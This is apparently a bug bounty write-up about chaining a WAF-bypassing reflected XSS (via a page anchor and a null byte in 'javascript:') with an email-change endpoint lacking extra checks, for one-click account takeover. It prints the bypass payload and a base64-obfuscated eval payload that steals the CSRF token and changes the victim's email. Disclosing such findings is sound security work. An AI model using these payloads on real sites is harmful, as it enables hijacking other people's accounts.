---
layout: post
category: writeups
---

A month ago i was trying to hack a company that had just invited me to its bug bounty program. The company had been running the program since 2017, so I didn't expect to find much, because I knew it had been tested by tons of bug hunters. Looking at the leaderboard the situation did not improve, there were so many great hackers from the ranking of the top 100 in the world. I decided to focus on the main site.
After half an hour of searching I had found only a low vulnerability (closed with a $ X00 payment). I really wanted to find something a little more serious for personal satisfaction and so I continued to dig deep into the site. 

# Found a redirect parameter!
I soon came across an endpoint that used an r parameter to redirect to other pages on the site. I immediately tried redirecting to a random site, but unfortunately, the site in question had a firewall. I also tried to inject Javascript, but nothing. After two hours of trying various payloads and obfuscating portions of code with various techniques, I was able to find a bypass for an xss, using various techniques, but the browser, unfortunately, was not running it. I took a break from that program and rested, trying to think about it as little as possible. 

# Solution
After a few hours, I came up with a method that I had not tested, which is to exploit an anchor on the site. I turned on the pc, tried a simple payload like `javascript:alert()` , but before forwarding the url, I asked for an anchor on the page.
BOOM, using an anchor, the request did not go through the Web Firewall running my XSS. 

As soon as I found this bypass I thought: "will it also work in main pages?". I went to the main site's Homepage, found an anchor and tested my XSS. The code also ran on the home!

##### My final simple payload was: `target.com/#anchorNameInHome=X&r=javas%00cript:alert();%0A`

## Update

After a few days, the vulnerability was being triaged and I noticed an hidden parameter in the change settings endpoint. basically, by editing the profile and adding a newmail parameter in the post request it was possible to obtain an email with a link to change the email of one's account. Nothing strange, a simple function to change your account email. The problem is that it didn't use any two-factor authentication or any other protection, it only checked if the session cookies were the right ones, otherwise it returned a 403 forbidden.
An attacker could use the xss found in the main site to do a post request in the API endpoint in the settings of the profile of the user to change the victim email. The parameters required for the post request would be csrfToken, email, and new email. The following code in JavaScript would be used to change the victim email and execute an account takeover:
In order to exploit this vulnerability I wrote a fetch Post request in javascript to change the victim mail to an Attacker mail, and I passed it to the xss.

final payload to do a one click account takeover:

`target.com/#anchorNameInHome=X&r=javas%00cript:eval(atob("ZmV0Y2goY2hhbmdlTWFpbEVuZHBvaW50LCB7CiAgICBjcmVkZW50aWFsczogImluY2x1ZGUiLAp9KS50aGVuKHJlc3BvbnNlID0+IHsKICAgIGNvbnNvbGUubG9nKHJlc3BvbnNlLmNvb2tpZSk7CiAgICByZXR1cm4gcmVzcG9uc2UudGV4dCgpOwp9KS50aGVuKGh0bWwgPT4gewogICAgY29uc3QgY3NyZl90b2tlbiA9IGh0bWwuc3BsaXQoJ2NzcmZUb2tlbiIgdmFsdWU9IicpWzFdLnNwbGl0KCciJylbMF07CiAgICBjb25zdCBwYXJhbXMgPSB7CiAgICAgICAgY3NyZlRva2VuOiBjc3JmX3Rva2VuLAogICAgICAgIHVzZXJuYW1lOiAiIiwKICAgICAgICBpY29uSWQ6ICIiLAogICAgICAgIGVtYWlsOiBWSUNUSU0tRU1BSUwsCiAgICAgICAgbmV3RW1haWw6IEFUVEFDS0VSLUVNQUlMLAogICAgfTsKICAgIGZldGNoKEVORFBPSU5ULCB7CiAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgY3JlZGVudGlhbHM6ICJpbmNsdWRlIiwKICAgICAgICBib2R5OiBuZXcgVVJMU2VhcmNoUGFyYW1zKHBhcmFtcyksCiAgICB9KTsKfSk7
"));%0A`


With this post request, an attacker could change the victim email and take control of their account. 
